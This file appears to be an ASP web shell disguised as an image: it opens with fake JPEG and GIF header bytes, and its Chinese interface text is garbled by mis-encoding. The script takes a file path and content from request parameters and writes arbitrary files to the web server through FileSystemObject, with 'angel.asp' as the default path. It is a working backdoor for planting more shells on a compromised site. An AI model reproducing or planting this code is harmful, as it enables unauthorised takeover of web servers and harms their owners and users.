���� JFIF      �� C �� C��  � �" ��           	
�� �   } !1AQa"q2���#B��R��$3br�	
gif89a;
<%
Name="��ASPС��"     '����
Copyright="�����X����������ľWվ�ҹ���|�W���ڿ����oֹ��"    '��Ȩ
imgurl="http://bbs.feizhuliu.com.cn/UpFile/UpAttachment/2007-2/200721413838.jpg" 'ͼƬ
Sub RRS(str)
response.write(str)
End Sub
dim objFSO,fdata,objCountFile
on error resume next
Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
if Trim(request("syfdpath"))<>"" then
fdata = request("cyfddata")
Set objCountFile=objFSO.CreateTextFile(request("syfdpath"),True)
objCountFile.Write fdata
if err =0 then response.write "<font color=red>���R�ɹ��ς�!</font>"
err.clear
end if
objCountFile.Close
Set objCountFile=Nothing
Set objFSO = Nothing
response.write "<center><body text=""RED"" >�ڰ��������������磬����ʧ�˷���</center>"
server.mappath(request.servervariables("script_name"))
response.write "<br>"
RRS"<body bgcolor=""#000000""><div align=""center"">"
RRS"  <table width=""400"" border=""0"" cellpadding=""1"" cellspacing=""1"" bgcolor=""#CCCCCC"">"
RRS"    <tr> "
RRS"      <td  align=""center"" bgcolor=""#000000""><img src="&imgurl&"></td>"
RRS"    </tr>"
RRS"    <tr> "
RRS"      <td align=""center"" bgcolor=""#000000""><font color=""RED"" size=5pt class=>"&Name&"</font></a></td>"
RRS"    </tr>"
RRS"    <tr> "
RRS"      <td align=""center"" bgcolor=""#000000""><form method=post>"
RRS"          <table width=""95%"" border=""0"" cellpadding=""3"" cellspacing=""1"" bgcolor=""#8B0000"">"
RRS"            <tr> "
RRS"              <td width=""80%"" bgcolor=""#000000""><input type=text name=syfdpath value="&server.mappath("angel.asp")&" size=60></td>"
RRS"              <td bgcolor=""#000000""><input name=""submit"" type=submit value=""�ς�""></td>"
RRS"            </tr>"
RRS"            <tr> "
RRS"             <td colspan=""2"" bgcolor=""#000000""><textarea name=cyfddata cols=80 rows=10 width=32 >Ո�ڴ��ı��^���ݔ����R���ݣ�</textarea></td>"
RRS"            </tr>"
RRS"          </table>"
RRS"        </form></td>"
RRS"    </tr>"
RRS"    <tr>"
RRS"      <td align=""center"" bgcolor=""#000000""><font color=""BLUE"">"&Copyright&"</font></td>"
RRS"    </tr>"
RRS"  </table>"
RRS"</div>"
RRS"</div>"%>"
